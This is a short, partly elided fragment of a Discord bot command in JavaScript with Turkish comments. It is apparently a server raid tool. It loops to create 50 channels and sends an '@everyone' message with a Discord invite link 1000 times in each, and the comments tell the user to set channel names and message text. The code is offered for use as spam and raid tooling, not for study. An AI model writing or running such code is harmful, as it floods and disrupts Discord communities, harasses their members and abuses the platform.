module.exports.run = async (client, message, args) => {
    var channelNames =  ["rate","anox"]; //buraya istediğiniz kadar kanal adı girin hepsini açıp mesaj atıcak 29. satırı kontrol et!
    ...
    for(let i = 0; i < 50; i++) {
        ...
        message.guild.channels.create(channelName, {
            ...
            for(let i = 0; i < 1000; i++) { ///süreyi elleme 
                channel.send({ content: "@everyone https://discord.gg/anox" });//// burada açtığı tüm kanallara ever spamı atar mesaj içeriğini yazın kısaca
            }
        });
    }
}
